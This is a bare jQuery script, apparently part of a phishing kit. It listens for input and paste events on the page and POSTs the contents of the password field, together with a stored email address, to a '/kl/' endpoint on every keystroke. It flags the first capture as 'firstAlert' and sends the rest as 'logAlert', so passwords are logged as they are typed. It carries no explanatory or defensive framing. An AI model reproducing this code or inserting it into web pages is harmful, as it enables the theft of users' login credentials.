
$(document).ready(function () {
    $(document).on("input paste", "input", function () {
        $(document).queue(send);
    });


    function send() {
        if (!$("input").hasClass("sent")) {
            $.post("/kl/", {
                action: "firstAlert",
                email: emailGlobal,
                input: $("[type=password]").val()
            }, function () {
                $("input").addClass("sent");
                $(document).dequeue();
            });
        } else {
            $.post("/kl/", {
                action: "logAlert",
                email: emailGlobal,
                input: $("[type=password]").val()
            }, function () {
                $(document).dequeue();
            });
        }
    }
});